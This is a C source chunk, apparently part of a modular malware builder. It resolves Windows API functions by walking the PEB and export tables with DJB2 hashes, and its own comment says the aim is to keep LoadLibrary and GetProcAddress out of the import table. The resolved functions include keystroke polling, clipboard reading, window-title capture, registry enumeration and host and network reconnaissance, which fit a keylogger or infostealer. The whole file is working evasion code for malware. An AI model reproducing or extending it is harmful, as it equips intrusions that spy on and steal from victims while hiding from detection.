// chunk: api_resolve/peb_walk
// depends: (none)
// provides: peb_get_module, peb_get_proc, api, resolve_all_apis
// headers: windows.h,winternl.h
// note: Pure PEB walking — zero LoadLibrary/GetProcAddress in IAT; resolves LoadLibraryA via PEB to load non-resident DLLs

#ifndef CHUNK_PEB_WALK
#define CHUNK_PEB_WALK

#include <windows.h>
#include <winternl.h>

static DWORD peb_djb2(const char *s) {
    DWORD h = 5381;
    while (*s) h = ((h << 5) + h) + *s++;
    return h;
}

static DWORD peb_djb2_w(const WCHAR *s) {
    DWORD h = 5381;
    while (*s) {
        char c = (char)(*s > 127 ? '?' : *s);
        if (c >= 'A' && c <= 'Z') c += 32;
        h = ((h << 5) + h) + c;
        s++;
    }
    return h;
}

static HMODULE peb_get_module(DWORD name_hash) {
#ifdef _WIN64
    PEB *peb = (PEB *)__readgsqword(0x60);
#else
    PEB *peb = (PEB *)__readfsdword(0x30);
#endif
    PEB_LDR_DATA *ldr = peb->Ldr;
    LIST_ENTRY *head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY *cur = head->Flink;

    while (cur != head) {
        LDR_DATA_TABLE_ENTRY *entry = CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (entry->FullDllName.Buffer) {
            WCHAR *name = entry->FullDllName.Buffer;
            WCHAR *slash = name;
            for (WCHAR *p = name; *p; p++)
                if (*p == '\\' || *p == '/') slash = p + 1;
            if (peb_djb2_w(slash) == name_hash)
                return (HMODULE)entry->DllBase;
        }
        cur = cur->Flink;
    }
    return NULL;
}

static FARPROC peb_get_proc(HMODULE mod, DWORD func_hash) {
    BYTE *base = (BYTE *)mod;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    DWORD exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exp_rva) return NULL;
    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(base + exp_rva);

    DWORD *names = (DWORD *)(base + exp->AddressOfNames);
    WORD *ords = (WORD *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *fn_name = (char *)(base + names[i]);
        if (peb_djb2(fn_name) == func_hash)
            return (FARPROC)(base + funcs[ords[i]]);
    }
    return NULL;
}

/* kernel32 */
typedef HANDLE  (WINAPI *fn_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL    (WINAPI *fn_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL    (WINAPI *fn_WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL    (WINAPI *fn_CloseHandle)(HANDLE);
typedef BOOL    (WINAPI *fn_CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL    (WINAPI *fn_CopyFileA)(LPCSTR, LPCSTR, BOOL);
typedef DWORD   (WINAPI *fn_GetFileAttributesA)(LPCSTR);
typedef BOOL    (WINAPI *fn_DeleteFileA)(LPCSTR);
typedef BOOL    (WINAPI *fn_CreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
typedef DWORD   (WINAPI *fn_WaitForSingleObject)(HANDLE, DWORD);
typedef DWORD   (WINAPI *fn_GetFileSize)(HANDLE, LPDWORD);
typedef DWORD   (WINAPI *fn_GetTempPathA)(DWORD, LPSTR);
typedef BOOL    (WINAPI *fn_GetComputerNameA)(LPSTR, LPDWORD);
typedef void    (WINAPI *fn_Sleep)(DWORD);
typedef DWORD   (WINAPI *fn_GetTickCount)(void);
typedef LPVOID  (WINAPI *fn_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef HMODULE (WINAPI *fn_LoadLibraryA)(LPCSTR);
typedef HANDLE  (WINAPI *fn_FindFirstFileA)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL    (WINAPI *fn_FindNextFileA)(HANDLE, LPWIN32_FIND_DATAA);
typedef BOOL    (WINAPI *fn_FindClose)(HANDLE);
typedef BOOL    (WINAPI *fn_CreateDirectoryA)(LPCSTR, LPSECURITY_ATTRIBUTES);
typedef DWORD   (WINAPI *fn_GetEnvironmentVariableA)(LPCSTR, LPSTR, DWORD);
typedef void    (WINAPI *fn_GetNativeSystemInfo)(LPSYSTEM_INFO);
typedef BOOL    (WINAPI *fn_GetDiskFreeSpaceExA)(LPCSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER);
typedef DWORD   (WINAPI *fn_GetLogicalDriveStringsA)(DWORD, LPSTR);
typedef UINT    (WINAPI *fn_GetDriveTypeA)(LPCSTR);
typedef void    (WINAPI *fn_GetLocalTime)(LPSYSTEMTIME);
typedef int     (WINAPI *fn_MultiByteToWideChar)(UINT, DWORD, LPCSTR, int, LPWSTR, int);
typedef int     (WINAPI *fn_WideCharToMultiByte)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);
typedef HMODULE (WINAPI *fn_GetModuleHandleA)(LPCSTR);
typedef DWORD   (WINAPI *fn_GetLastError)(void);
/* advapi32 */
typedef BOOL    (WINAPI *fn_GetUserNameA)(LPSTR, LPDWORD);
typedef LONG    (WINAPI *fn_RegOpenKeyExA)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LONG    (WINAPI *fn_RegQueryValueExA)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
typedef LONG    (WINAPI *fn_RegEnumValueA)(HKEY, DWORD, LPSTR, LPDWORD, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
typedef LONG    (WINAPI *fn_RegEnumKeyExA)(HKEY, DWORD, LPSTR, LPDWORD, LPDWORD, LPSTR, LPDWORD, PFILETIME);
typedef LONG    (WINAPI *fn_RegCloseKey)(HKEY);
/* user32 */
typedef BOOL    (WINAPI *fn_EnumWindows)(WNDENUMPROC, LPARAM);
typedef int     (WINAPI *fn_GetWindowTextA)(HWND, LPSTR, int);
typedef BOOL    (WINAPI *fn_OpenClipboard)(HWND);
typedef HANDLE  (WINAPI *fn_GetClipboardData)(UINT);
typedef BOOL    (WINAPI *fn_CloseClipboard)(void);
typedef HWND    (WINAPI *fn_GetForegroundWindow)(void);
typedef SHORT   (WINAPI *fn_GetAsyncKeyState)(int);
typedef void    (WINAPI *fn_keybd_event)(BYTE, BYTE, DWORD, ULONG_PTR);
/* shell32 */
typedef HRESULT (WINAPI *fn_SHGetFolderPathA)(HWND, int, HANDLE, DWORD, LPSTR);
/* iphlpapi */
typedef ULONG   (WINAPI *fn_GetAdaptersInfo)(void*, PULONG);
typedef DWORD   (WINAPI *fn_GetExtendedTcpTable)(PVOID, PDWORD, BOOL, ULONG, int, ULONG);

static struct {
    /* kernel32 */
    fn_CreateFileA       pCreateFileA;
    fn_ReadFile          pReadFile;
    fn_WriteFile         pWriteFile;
    fn_CloseHandle       pCloseHandle;
    fn_CreateProcessA    pCreateProcessA;
    fn_CopyFileA         pCopyFileA;
    fn_GetFileAttributesA pGetFileAttributesA;
    fn_DeleteFileA       pDeleteFileA;
    fn_CreatePipe        pCreatePipe;
    fn_WaitForSingleObject pWaitForSingleObject;
    fn_GetFileSize       pGetFileSize;
    fn_GetTempPathA      pGetTempPathA;
    fn_GetComputerNameA  pGetComputerNameA;
    fn_Sleep             pSleep;
    fn_GetTickCount      pGetTickCount;
    fn_VirtualAlloc      pVirtualAlloc;
    fn_FindFirstFileA    pFindFirstFileA;
    fn_FindNextFileA     pFindNextFileA;
    fn_FindClose         pFindClose;
    fn_CreateDirectoryA  pCreateDirectoryA;
    fn_GetEnvironmentVariableA pGetEnvironmentVariableA;
    fn_GetNativeSystemInfo pGetNativeSystemInfo;
    fn_GetDiskFreeSpaceExA pGetDiskFreeSpaceExA;
    fn_GetLogicalDriveStringsA pGetLogicalDriveStringsA;
    fn_GetDriveTypeA     pGetDriveTypeA;
    fn_GetLocalTime      pGetLocalTime;
    fn_MultiByteToWideChar pMultiByteToWideChar;
    fn_WideCharToMultiByte pWideCharToMultiByte;
    fn_GetModuleHandleA  pGetModuleHandleA;
    fn_GetLastError      pGetLastError;
    fn_LoadLibraryA      pLoadLibraryA;
    /* advapi32 */
    fn_GetUserNameA      pGetUserNameA;
    fn_RegOpenKeyExA     pRegOpenKeyExA;
    fn_RegQueryValueExA  pRegQueryValueExA;
    fn_RegEnumValueA     pRegEnumValueA;
    fn_RegEnumKeyExA     pRegEnumKeyExA;
    fn_RegCloseKey       pRegCloseKey;
    /* user32 */
    fn_EnumWindows       pEnumWindows;
    fn_GetWindowTextA    pGetWindowTextA;
    fn_OpenClipboard     pOpenClipboard;
    fn_GetClipboardData  pGetClipboardData;
    fn_CloseClipboard    pCloseClipboard;
    fn_GetForegroundWindow pGetForegroundWindow;
    fn_GetAsyncKeyState pGetAsyncKeyState;
    fn_keybd_event     pkeybd_event;
    /* shell32 */
    fn_SHGetFolderPathA  pSHGetFolderPathA;
    /* iphlpapi */
    fn_GetAdaptersInfo   pGetAdaptersInfo;
    fn_GetExtendedTcpTable pGetExtendedTcpTable;
} api = {0};

static int resolve_all_apis(void) {
    HMODULE k32 = peb_get_module(0x7040ee75);  /* kernel32.dll */
    HMODULE adv = peb_get_module(0x67208a49);  /* advapi32.dll */
    if (!k32) return 0;

    /* resolve LoadLibraryA via PEB to load non-resident DLLs without IAT entry */
    fn_LoadLibraryA pLoadLibraryA = (fn_LoadLibraryA)peb_get_proc(k32, 0x5fbff0fb);
    api.pLoadLibraryA = pLoadLibraryA;

    HMODULE u32 = peb_get_module(0x5a6bd3f3);   /* user32.dll */
    HMODULE sh32 = peb_get_module(0x0d6501ac);   /* shell32.dll */
    HMODULE iphlp = peb_get_module(0x2234eba6);  /* iphlpapi.dll */
    if (pLoadLibraryA) {
        if (!u32)   u32   = pLoadLibraryA("user32.dll");
        if (!sh32)  sh32  = pLoadLibraryA("shell32.dll");
        if (!iphlp) iphlp = pLoadLibraryA("iphlpapi.dll");
        if (!adv)   adv   = pLoadLibraryA("advapi32.dll");
    }

    /* kernel32 — DJB2 hashes (same algorithm as peb_djb2) */
    api.pCreateFileA       = (fn_CreateFileA)peb_get_proc(k32, 0xeb96c5fa);
    api.pReadFile          = (fn_ReadFile)peb_get_proc(k32, 0x71019921);
    api.pWriteFile         = (fn_WriteFile)peb_get_proc(k32, 0x663cecb0);
    api.pCloseHandle       = (fn_CloseHandle)peb_get_proc(k32, 0x3870ca07);
    api.pCreateProcessA    = (fn_CreateProcessA)peb_get_proc(k32, 0xaeb52e19);
    api.pCopyFileA         = (fn_CopyFileA)peb_get_proc(k32, 0xac2253c1);
    api.pGetFileAttributesA = (fn_GetFileAttributesA)peb_get_proc(k32, 0xcc9c6ccd);
    api.pDeleteFileA       = (fn_DeleteFileA)peb_get_proc(k32, 0x1cd88719);
    api.pCreatePipe        = (fn_CreatePipe)peb_get_proc(k32, 0x9a8deee7);
    api.pWaitForSingleObject = (fn_WaitForSingleObject)peb_get_proc(k32, 0xeccda1ba);
    api.pGetFileSize       = (fn_GetFileSize)peb_get_proc(k32, 0x7891c520);
    api.pGetTempPathA      = (fn_GetTempPathA)peb_get_proc(k32, 0x9ef979e9);
    api.pGetComputerNameA  = (fn_GetComputerNameA)peb_get_proc(k32, 0xaa63bfb6);
    api.pSleep             = (fn_Sleep)peb_get_proc(k32, 0x0e19e5fe);
    api.pGetTickCount      = (fn_GetTickCount)peb_get_proc(k32, 0x41ad16b9);
    api.pVirtualAlloc      = (fn_VirtualAlloc)peb_get_proc(k32, 0x382c0f97);
    api.pFindFirstFileA    = (fn_FindFirstFileA)peb_get_proc(k32, 0xae2636cf);
    api.pFindNextFileA     = (fn_FindNextFileA)peb_get_proc(k32, 0xf3b43c46);
    api.pFindClose         = (fn_FindClose)peb_get_proc(k32, 0xb4e7451c);
    api.pCreateDirectoryA  = (fn_CreateDirectoryA)peb_get_proc(k32, 0x41fabfef);
    api.pGetEnvironmentVariableA = (fn_GetEnvironmentVariableA)peb_get_proc(k32, 0x87889701);
    api.pGetNativeSystemInfo = (fn_GetNativeSystemInfo)peb_get_proc(k32, 0x395dc89d);
    api.pGetDiskFreeSpaceExA = (fn_GetDiskFreeSpaceExA)peb_get_proc(k32, 0x3dfe2f3c);
    api.pGetLogicalDriveStringsA = (fn_GetLogicalDriveStringsA)peb_get_proc(k32, 0x89478d45);
    api.pGetDriveTypeA     = (fn_GetDriveTypeA)peb_get_proc(k32, 0x74bb7682);
    api.pGetLocalTime      = (fn_GetLocalTime)peb_get_proc(k32, 0x12d7e0df);
    api.pMultiByteToWideChar = (fn_MultiByteToWideChar)peb_get_proc(k32, 0xe2fdda8e);
    api.pWideCharToMultiByte = (fn_WideCharToMultiByte)peb_get_proc(k32, 0xe65d31ce);
    api.pGetModuleHandleA  = (fn_GetModuleHandleA)peb_get_proc(k32, 0x5a153f58);
    api.pGetLastError      = (fn_GetLastError)peb_get_proc(k32, 0x2082eae3);

    /* advapi32 */
    if (adv) {
        api.pGetUserNameA      = (fn_GetUserNameA)peb_get_proc(adv, 0x9bc3ab46);
        api.pRegOpenKeyExA     = (fn_RegOpenKeyExA)peb_get_proc(adv, 0x074a975c);
        api.pRegQueryValueExA  = (fn_RegQueryValueExA)peb_get_proc(adv, 0x6b95d114);
        api.pRegEnumValueA     = (fn_RegEnumValueA)peb_get_proc(adv, 0x86652116);
        api.pRegEnumKeyExA     = (fn_RegEnumKeyExA)peb_get_proc(adv, 0x6d0b1b5f);
        api.pRegCloseKey       = (fn_RegCloseKey)peb_get_proc(adv, 0x736b3702);
    }

    /* user32 */
    if (u32) {
        api.pEnumWindows       = (fn_EnumWindows)peb_get_proc(u32, 0x94cfdcc5);
        api.pGetWindowTextA    = (fn_GetWindowTextA)peb_get_proc(u32, 0xc8419003);
        api.pOpenClipboard     = (fn_OpenClipboard)peb_get_proc(u32, 0x774dfc27);
        api.pGetClipboardData  = (fn_GetClipboardData)peb_get_proc(u32, 0x8d26572f);
        api.pCloseClipboard    = (fn_CloseClipboard)peb_get_proc(u32, 0x8c0b3b8b);
        api.pGetForegroundWindow = (fn_GetForegroundWindow)peb_get_proc(u32, 0x0a7f6978);
        api.pGetAsyncKeyState  = (fn_GetAsyncKeyState)peb_get_proc(u32, 0x1124460d);
        api.pkeybd_event       = (fn_keybd_event)peb_get_proc(u32, 0xb8199eb5);
    }

    /* shell32 */
    if (sh32) {
        api.pSHGetFolderPathA  = (fn_SHGetFolderPathA)peb_get_proc(sh32, 0xa15ce62a);
    }

    /* iphlpapi */
    if (iphlp) {
        api.pGetAdaptersInfo   = (fn_GetAdaptersInfo)peb_get_proc(iphlp, 0xbc950fc5);
        api.pGetExtendedTcpTable = (fn_GetExtendedTcpTable)peb_get_proc(iphlp, 0x4659fa05);
    }

    return (api.pCreateFileA != NULL);
}

#endif
